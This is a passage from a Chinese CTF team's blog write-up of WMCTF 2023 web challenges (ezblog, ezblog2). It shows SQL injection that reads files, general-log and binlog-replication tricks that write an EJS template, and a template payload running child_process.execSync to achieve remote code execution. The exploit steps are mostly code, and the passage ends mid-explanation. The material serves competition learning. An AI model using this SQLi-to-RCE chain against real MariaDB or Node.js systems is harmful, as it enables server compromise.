<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>2023 WMCTF SU Write-Up - su-team</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="su-team"><meta name="msapplication-TileImage" content="/img/SU4.jpg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="su-team"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="感谢 WM 的师傅们精心准备的比赛！本次比赛我们 SU 取得了 10nd 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com 以下是我们 SU 本次 WMCTF 2023 的 writeup。"><meta property="og:type" content="blog"><meta property="og:title" content="2023 WMCTF SU Write-Up"><meta property="og:url" content="https://team-su.github.io/2023/08/19/2023-08-19Wmctf/"><meta property="og:site_name" content="su-team"><meta property="og:description" content="感谢 WM 的师傅们精心准备的比赛！本次比赛我们 SU 取得了 10nd 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com 以下是我们 SU 本次 WMCTF 2023 的 writeup。"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://team-su.github.io/2023/08/19/2023-08-19Wmctf/20230821210707797.jpg"><meta property="og:image" content="https://team-su.github.io/2023/08/19/2023-08-19Wmctf/20230821210708018.jpg"><meta property="og:image" content="https://team-su.github.io/2023/08/19/2023-08-19Wmctf/20230821210708558.jpg"><meta property="og:image" content="https://team-su.github.io/2023/08/19/2023-08-19Wmctf/20230821210707945.jpg"><meta property="og:image" content="https://team-su.github.io/2023/08/19/2023-08-19Wmctf/20230821210708748.jpg"><meta property="og:image" content="https://team-su.github.io/2023/08/19/2023-08-19Wmctf/20230821210707921.jpg"><meta property="og:image" content="https://team-su.github.io/2023/08/19/2023-08-19Wmctf/20230821210711167.jpg"><meta property="og:image" content="https://team-su.github.io/2023/08/19/2023-08-19Wmctf/20230821210711091.jpg"><meta property="og:image" content="https://team-su.github.io/2023/08/19/2023-08-19Wmctf/20230821210711409.jpg"><meta property="og:image" content="https://team-su.github.io/2023/08/19/2023-08-19Wmctf/20230821210711397.jpg"><meta property="og:image" content="https://team-su.github.io/2023/08/19/2023-08-19Wmctf/20230821210711450.jpg"><meta property="og:image" content="https://team-su.github.io/2023/08/19/2023-08-19Wmctf/20230821210711499.jpg"><meta property="article:published_time" content="2023-08-19T13:35:50.000Z"><meta property="article:modified_time" content="2025-06-03T13:49:25.929Z"><meta property="article:author" content="SUers"><meta property="article:tag" content="WMCTF"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://team-su.github.io/2023/08/19/2023-08-19Wmctf/20230821210707797.jpg"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://team-su.github.io/2023/08/19/2023-08-19Wmctf/"},"headline":"2023 WMCTF SU Write-Up","image":["https://team-su.github.io/2023/08/19/2023-08-19Wmctf/20230821210707797.jpg","https://team-su.github.io/2023/08/19/2023-08-19Wmctf/20230821210708018.jpg","https://team-su.github.io/2023/08/19/2023-08-19Wmctf/20230821210708558.jpg","https://team-su.github.io/2023/08/19/2023-08-19Wmctf/20230821210707945.jpg","https://team-su.github.io/2023/08/19/2023-08-19Wmctf/20230821210708748.jpg","https://team-su.github.io/2023/08/19/2023-08-19Wmctf/20230821210707921.jpg","https://team-su.github.io/2023/08/19/2023-08-19Wmctf/20230821210711167.jpg","https://team-su.github.io/2023/08/19/2023-08-19Wmctf/20230821210711091.jpg","https://team-su.github.io/2023/08/19/2023-08-19Wmctf/20230821210711409.jpg","https://team-su.github.io/2023/08/19/2023-08-19Wmctf/20230821210711397.jpg","https://team-su.github.io/2023/08/19/2023-08-19Wmctf/20230821210711450.jpg","https://team-su.github.io/2023/08/19/2023-08-19Wmctf/20230821210711499.jpg"],"datePublished":"2023-08-19T13:35:50.000Z","dateModified":"2025-06-03T13:49:25.929Z","author":{"@type":"Person","name":"SUers"},"publisher":{"@type":"Organization","name":"su-team","logo":{"@type":"ImageObject","url":"https://team-su.github.io/img/SU4.jpg"}},"description":"感谢 WM 的师傅们精心准备的比赛！本次比赛我们 SU 取得了 10nd 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com 以下是我们 SU 本次 WMCTF 2023 的 writeup。"}</script><link rel="canonical" href="https://team-su.github.io/2023/08/19/2023-08-19Wmctf/"><link rel="alternate" href="/atom.xml" title="su-team" type="application/atom+xml"><link rel="icon" href="/img/SU4.jpg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/SU4.jpg" alt="su-team" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a><a class="navbar-item" href="/members">Members</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/team-su"><i class="fab fa-github"></i></a><a class="navbar-item" target="_blank" rel="noopener" title="RSS Feed" href="/atom.xml"><i class="fas fa-rss"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="Catalogue" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2023-08-19T13:35:50.000Z" title="2023/8/19 21:35:50">2023-08-19</time></span><span class="level-item">Updated&nbsp;<time dateTime="2025-06-03T13:49:25.929Z" title="2025/6/3 21:49:25">2025-06-03</time></span><span class="level-item">an hour read (About 8896 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">2023 WMCTF SU Write-Up</h1><div class="content"><p>感谢 WM 的师傅们精心准备的比赛！本次比赛我们 SU 取得了 10nd 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：<a href="mailto:&#115;&#117;&#101;&#x72;&#x73;&#x5f;&#x78;&#x63;&#x74;&#x66;&#64;&#49;&#50;&#x36;&#x2e;&#x63;&#x6f;&#x6d;">suers_xctf@126.com</a></p>
<p>以下是我们 SU 本次 WMCTF 2023 的 writeup。</p>
<span id="more"></span>
<hr>
<p>感谢 WM 的师傅们精心准备的比赛！本次比赛我们 SU 取得了 10nd 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：<a href="mailto:&#115;&#117;&#101;&#114;&#115;&#x5f;&#120;&#x63;&#116;&#x66;&#64;&#49;&#x32;&#54;&#x2e;&#x63;&#x6f;&#109;">suers_xctf@126.com</a></p>
<p>以下是我们 SU 本次 WMCTF 2023 的 writeup。</p>
<hr>
<p>[TOC]</p>
<h1><span id="web">Web</span><a href="#web" class="header-anchor"></a></h1><h2><span id="ezblog">ezblog</span><a href="#ezblog" class="header-anchor"></a></h2><p>获取uuid，访问<code>/console</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /post/0%20union%20select%20TO%5FBASE64%28load%5Ffile%28%22%2Fhome%2Fezblog%2F%2Epm2%2Flogs%2Fmain%2Dout%2Elog%22%29%29%2C%272%27%2C3/edit </span><br></pre></td></tr></table></figure>

<p>利用&#x2F;api&#x2F;debugger&#x2F;sql&#x2F;execute路由，执行大部分SQL语句，因为<code>post.ejs</code>读写权限为777，所以设置mariadb的常规日志记录在<code>/home/ezblog/views/post.ejs</code></p>
<p>下面是利用到的sql语句，然后再利用<code>/api/debugger/template/test</code>路由访问<code>post.ejs</code>模板即可</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE mysql;</span><br><span class="line"><span class="keyword">CREATE TABLE</span> mysql.general_log(</span><br><span class="line">event_time <span class="type">timestamp</span> <span class="keyword">NOT NULL</span> <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span> <span class="keyword">ON</span> <span class="keyword">UPDATE</span> <span class="built_in">CURRENT_TIMESTAMP</span>,</span><br><span class="line">user_host mediumtext <span class="keyword">NOT NULL</span>,</span><br><span class="line">thread_id <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT NULL</span>,</span><br><span class="line">server_id <span class="type">int</span>(<span class="number">10</span>) unsigned <span class="keyword">NOT NULL</span>,</span><br><span class="line">command_type <span class="type">varchar</span>(<span class="number">64</span>) <span class="keyword">NOT NULL</span>,</span><br><span class="line">argument mediumtext <span class="keyword">NOT NULL</span></span><br><span class="line">) ENGINE<span class="operator">=</span>CSV <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8 COMMENT<span class="operator">=</span><span class="string">&#x27;General log&#x27;</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log <span class="operator">=</span> &quot;ON&quot;;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file<span class="operator">=</span><span class="string">&#x27;/home/ezblog/views/post.ejs&#x27;</span>;</span><br><span class="line"><span class="operator">&lt;=</span><span class="operator">-</span> global.process.mainModule.constructor._load(`child_process`).execSync(`<span class="operator">/</span>readflag`).toString() <span class="operator">=</span><span class="operator">&gt;</span></span><br></pre></td></tr></table></figure>

<p>参考连接：</p>
<p><a href="https://hxp.io/blog/101/hxp-CTF-2022-valentine/">https://hxp.io/blog/101/hxp-CTF-2022-valentine/</a></p>
<p><a href="https://www.sqlsec.com/2020/11/mysql.html#into-oufile-%E5%86%99-shell">https://www.sqlsec.com/2020/11/mysql.html#into-oufile-%E5%86%99-shell</a></p>
<h2><span id="ezblog2">ezblog2</span><a href="#ezblog2" class="header-anchor"></a></h2><p>大体思路一样，难点就于主从复制上，关闭主服务器的CRC32，手动修改Binary Log，导致从服务器执行SQL语句</p>
<p>获取uuid，访问<code>/console</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /post/0%20union%20select%20TO%5FBASE64%28load%5Ffile%28%22%2Fhome%2Fezblog%2F%2Epm2%2Flogs%2Fmain%2Dout%2Elog%22%29%29%2C%272%27%2C3/edit </span><br></pre></td></tr></table></figure>

<p>主服务器激活Binary Log</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/etc/my.cnf</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This group is read both by the client and the server</span></span><br><span class="line"><span class="comment"># use it for options that affect everything</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">[client-server]</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># include *.cnf from the config directory</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">!includedir /etc/my.cnf.d</span><br><span class="line"></span><br><span class="line">[mysqld]</span><br><span class="line">server_id       = 2</span><br><span class="line">secure_file_priv=</span><br><span class="line">log-bin         = mysql-bin</span><br><span class="line">binlog_format = MIXED</span><br></pre></td></tr></table></figure>

<p>主服务器执行如下语句（我是用mycli连接的）</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MariaDB root@(<span class="keyword">none</span>):test<span class="operator">&gt;</span> <span class="keyword">set</span> <span class="keyword">global</span> binlog_checksum <span class="operator">=</span> <span class="number">0</span>; #关闭主服务器的CRC32</span><br><span class="line">MariaDB root@(<span class="keyword">none</span>):test<span class="operator">&gt;</span> reset master; #删除所有二进制日志文件</span><br><span class="line">MariaDB root@(<span class="keyword">none</span>):test<span class="operator">&gt;</span> <span class="keyword">create</span> database test;</span><br><span class="line">MariaDB root@(<span class="keyword">none</span>):test<span class="operator">&gt;</span> <span class="keyword">CREATE TABLE</span> employees (</span><br><span class="line">                        id <span class="type">INT</span>,</span><br><span class="line">                        name <span class="type">VARCHAR</span>(<span class="number">100</span>),</span><br><span class="line">                        age <span class="type">INT</span></span><br><span class="line">                        );</span><br><span class="line">MariaDB root@(<span class="keyword">none</span>):test<span class="operator">&gt;</span><span class="keyword">INSERT INTO</span> employees(id, name, age) <span class="keyword">VALUES</span>(<span class="number">1</span>, <span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>, <span class="number">30</span>)</span><br><span class="line">MariaDB root@(<span class="keyword">none</span>):test<span class="operator">&gt;</span><span class="keyword">create</span> database test2;</span><br></pre></td></tr></table></figure>

<p>因为Binary Log只记录如<a href="https://mariadb.com/kb/en/create/">CREATE</a>、<a href="https://mariadb.com/kb/en/alter/">ALTER</a>、<a href="https://mariadb.com/kb/en/insert/">INSERT</a>、<a href="https://mariadb.com/kb/en/update/">UPDATE</a>和<a href="https://mariadb.com/kb/en/delete/">DELETE</a>之类对数据有影响的语句，对数据没有影响的语句（如 SELECT 和 SHOW ）不会被记录，这里创建create database语句只是为了观察主从复制时是否出错，至关重要的是INSERT语句，要与payload长度一致</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;%= process.mainModule.require(&quot;child_process&quot;).execSync(&quot;/readflag&quot;).toString() %&gt;&#x27;</span> <span class="keyword">into</span> outfile <span class="string">&#x27;/home/ezblog/views/114.ejs&#x27;</span></span><br><span class="line"><span class="keyword">INSERT INTO</span> employees(id, name, age) <span class="keyword">VALUES</span>(<span class="number">1</span>, <span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>, <span class="number">30</span>)</span><br></pre></td></tr></table></figure>

<p>找到binlog默认为<code>mysql-bin.000001</code>，我的binlog在<code>/var/lib/mysql/mysql-bin.000001</code>，用你喜欢的16进制编辑进行编辑，我这里随便找了个，替换INSERT INTO xxx部分</p>
<p><img src="./20230821210707797.jpg" alt="img"></p>
<p><img src="./20230821210708018.jpg" alt="img"></p>
<p>用官方的<code>mysqlbinlog</code>查看mysql-bin是否报错，没有就进行替换</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysqlbinlog mysql-bin.000001</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">cp</span> mysql-bin.000001 /var/lib/mysql/</span><br></pre></td></tr></table></figure>

<p>可以看到已经成功替换了</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">MariaDB root@(<span class="keyword">none</span>):test<span class="operator">&gt;</span> <span class="keyword">SHOW</span> BINLOG EVENTS</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+------+-------------------+-----------+-------------+----------------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> Log_name         <span class="operator">|</span> Pos  <span class="operator">|</span> Event_type        <span class="operator">|</span> Server_id <span class="operator">|</span> End_log_pos <span class="operator">|</span> Info                                                                                                                                               <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+------+-------------------+-----------+-------------+----------------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> mysql<span class="operator">-</span>bin<span class="number">.000001</span> <span class="operator">|</span> <span class="number">4</span>    <span class="operator">|</span> Format_desc       <span class="operator">|</span> <span class="number">2</span>         <span class="operator">|</span> <span class="number">256</span>         <span class="operator">|</span> Server ver: <span class="number">11.0</span><span class="number">.3</span><span class="operator">-</span>MariaDB<span class="operator">-</span>log, Binlog ver: <span class="number">4</span>                                                                                                      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> mysql<span class="operator">-</span>bin<span class="number">.000001</span> <span class="operator">|</span> <span class="number">256</span>  <span class="operator">|</span> Gtid_list         <span class="operator">|</span> <span class="number">2</span>         <span class="operator">|</span> <span class="number">281</span>         <span class="operator">|</span> []                                                                                                                                                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> mysql<span class="operator">-</span>bin<span class="number">.000001</span> <span class="operator">|</span> <span class="number">281</span>  <span class="operator">|</span> Binlog_checkpoint <span class="operator">|</span> <span class="number">2</span>         <span class="operator">|</span> <span class="number">320</span>         <span class="operator">|</span> mysql<span class="operator">-</span>bin<span class="number">.000001</span>                                                                                                                                   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> mysql<span class="operator">-</span>bin<span class="number">.000001</span> <span class="operator">|</span> <span class="number">320</span>  <span class="operator">|</span> Gtid              <span class="operator">|</span> <span class="number">2</span>         <span class="operator">|</span> <span class="number">358</span>         <span class="operator">|</span> GTID <span class="number">0</span><span class="number">-2</span><span class="number">-1</span>                                                                                                                                         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> mysql<span class="operator">-</span>bin<span class="number">.000001</span> <span class="operator">|</span> <span class="number">358</span>  <span class="operator">|</span> Query             <span class="operator">|</span> <span class="number">2</span>         <span class="operator">|</span> <span class="number">448</span>         <span class="operator">|</span> <span class="keyword">drop</span> database test                                                                                                                                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> mysql<span class="operator">-</span>bin<span class="number">.000001</span> <span class="operator">|</span> <span class="number">448</span>  <span class="operator">|</span> Gtid              <span class="operator">|</span> <span class="number">2</span>         <span class="operator">|</span> <span class="number">486</span>         <span class="operator">|</span> GTID <span class="number">0</span><span class="number">-2</span><span class="number">-2</span>                                                                                                                                         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> mysql<span class="operator">-</span>bin<span class="number">.000001</span> <span class="operator">|</span> <span class="number">486</span>  <span class="operator">|</span> Query             <span class="operator">|</span> <span class="number">2</span>         <span class="operator">|</span> <span class="number">578</span>         <span class="operator">|</span> <span class="keyword">drop</span> database test1                                                                                                                                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> mysql<span class="operator">-</span>bin<span class="number">.000001</span> <span class="operator">|</span> <span class="number">578</span>  <span class="operator">|</span> Gtid              <span class="operator">|</span> <span class="number">2</span>         <span class="operator">|</span> <span class="number">616</span>         <span class="operator">|</span> GTID <span class="number">0</span><span class="number">-2</span><span class="number">-3</span>                                                                                                                                         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> mysql<span class="operator">-</span>bin<span class="number">.000001</span> <span class="operator">|</span> <span class="number">616</span>  <span class="operator">|</span> Query             <span class="operator">|</span> <span class="number">2</span>         <span class="operator">|</span> <span class="number">708</span>         <span class="operator">|</span> <span class="keyword">drop</span> database test2                                                                                                                                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> mysql<span class="operator">-</span>bin<span class="number">.000001</span> <span class="operator">|</span> <span class="number">708</span>  <span class="operator">|</span> Gtid              <span class="operator">|</span> <span class="number">2</span>         <span class="operator">|</span> <span class="number">746</span>         <span class="operator">|</span> GTID <span class="number">0</span><span class="number">-2</span><span class="number">-4</span>                                                                                                                                         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> mysql<span class="operator">-</span>bin<span class="number">.000001</span> <span class="operator">|</span> <span class="number">746</span>  <span class="operator">|</span> Query             <span class="operator">|</span> <span class="number">2</span>         <span class="operator">|</span> <span class="number">838</span>         <span class="operator">|</span> <span class="keyword">drop</span> database test5                                                                                                                                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> mysql<span class="operator">-</span>bin<span class="number">.000001</span> <span class="operator">|</span> <span class="number">838</span>  <span class="operator">|</span> Gtid              <span class="operator">|</span> <span class="number">2</span>         <span class="operator">|</span> <span class="number">876</span>         <span class="operator">|</span> GTID <span class="number">0</span><span class="number">-2</span><span class="number">-5</span>                                                                                                                                         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> mysql<span class="operator">-</span>bin<span class="number">.000001</span> <span class="operator">|</span> <span class="number">876</span>  <span class="operator">|</span> Query             <span class="operator">|</span> <span class="number">2</span>         <span class="operator">|</span> <span class="number">968</span>         <span class="operator">|</span> <span class="keyword">drop</span> database test6                                                                                                                                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> mysql<span class="operator">-</span>bin<span class="number">.000001</span> <span class="operator">|</span> <span class="number">968</span>  <span class="operator">|</span> Gtid              <span class="operator">|</span> <span class="number">2</span>         <span class="operator">|</span> <span class="number">1006</span>        <span class="operator">|</span> GTID <span class="number">0</span><span class="number">-2</span><span class="number">-6</span>                                                                                                                                         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> mysql<span class="operator">-</span>bin<span class="number">.000001</span> <span class="operator">|</span> <span class="number">1006</span> <span class="operator">|</span> Query             <span class="operator">|</span> <span class="number">2</span>         <span class="operator">|</span> <span class="number">1089</span>        <span class="operator">|</span> <span class="keyword">create</span> database test                                                                                                                               <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> mysql<span class="operator">-</span>bin<span class="number">.000001</span> <span class="operator">|</span> <span class="number">1089</span> <span class="operator">|</span> Gtid              <span class="operator">|</span> <span class="number">2</span>         <span class="operator">|</span> <span class="number">1127</span>        <span class="operator">|</span> GTID <span class="number">0</span><span class="number">-2</span><span class="number">-7</span>                                                                                                                                         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> mysql<span class="operator">-</span>bin<span class="number">.000001</span> <span class="operator">|</span> <span class="number">1127</span> <span class="operator">|</span> Query             <span class="operator">|</span> <span class="number">2</span>         <span class="operator">|</span> <span class="number">1348</span>        <span class="operator">|</span> use `test`; <span class="keyword">CREATE TABLE</span> employees (                                                                                                               <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>                  <span class="operator">|</span>      <span class="operator">|</span>                   <span class="operator">|</span>           <span class="operator">|</span>             <span class="operator">|</span>                        id <span class="type">INT</span>,                                                                                                                     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>                  <span class="operator">|</span>      <span class="operator">|</span>                   <span class="operator">|</span>           <span class="operator">|</span>             <span class="operator">|</span>                    name <span class="type">VARCHAR</span>(<span class="number">100</span>),                                                                                                              <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>                  <span class="operator">|</span>      <span class="operator">|</span>                   <span class="operator">|</span>           <span class="operator">|</span>             <span class="operator">|</span>                        age <span class="type">INT</span>                                                                                                                     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>                  <span class="operator">|</span>      <span class="operator">|</span>                   <span class="operator">|</span>           <span class="operator">|</span>             <span class="operator">|</span>                        )                                                                                                                           <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> mysql<span class="operator">-</span>bin<span class="number">.000001</span> <span class="operator">|</span> <span class="number">1348</span> <span class="operator">|</span> Gtid              <span class="operator">|</span> <span class="number">2</span>         <span class="operator">|</span> <span class="number">1386</span>        <span class="operator">|</span> <span class="keyword">BEGIN</span> GTID <span class="number">0</span><span class="number">-2</span><span class="number">-8</span>                                                                                                                                   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> mysql<span class="operator">-</span>bin<span class="number">.000001</span> <span class="operator">|</span> <span class="number">1386</span> <span class="operator">|</span> Query             <span class="operator">|</span> <span class="number">2</span>         <span class="operator">|</span> <span class="number">1583</span>        <span class="operator">|</span> use `test`; <span class="keyword">select</span> <span class="string">&#x27;&lt;%= process.mainModule.require(&quot;child_process&quot;).execSync(&quot;/readflag&quot;).toString() %&gt;&#x27;</span> <span class="keyword">into</span> outfile <span class="string">&#x27;/home/ezblog/views/114.ejs&#x27;</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> mysql<span class="operator">-</span>bin<span class="number">.000001</span> <span class="operator">|</span> <span class="number">1583</span> <span class="operator">|</span> Xid               <span class="operator">|</span> <span class="number">2</span>         <span class="operator">|</span> <span class="number">1610</span>        <span class="operator">|</span> <span class="keyword">COMMIT</span> <span class="comment">/* xid=116 */</span>                                                                                                                               <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> mysql<span class="operator">-</span>bin<span class="number">.000001</span> <span class="operator">|</span> <span class="number">1610</span> <span class="operator">|</span> Gtid              <span class="operator">|</span> <span class="number">2</span>         <span class="operator">|</span> <span class="number">1648</span>        <span class="operator">|</span> GTID <span class="number">0</span><span class="number">-2</span><span class="number">-9</span>                                                                                                                                         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> mysql<span class="operator">-</span>bin<span class="number">.000001</span> <span class="operator">|</span> <span class="number">1648</span> <span class="operator">|</span> Query             <span class="operator">|</span> <span class="number">2</span>         <span class="operator">|</span> <span class="number">1733</span>        <span class="operator">|</span> <span class="keyword">create</span> database test2                                                                                                                              <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+------+-------------------+-----------+-------------+----------------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br></pre></td></tr></table></figure>

<p>在题目的<code>/api/debugger/python/execute</code> 路由上执行如下SQL，然后利用<code>/api/debugger/template/test</code>路由访问<code>114.ejs</code>模板即可</p>
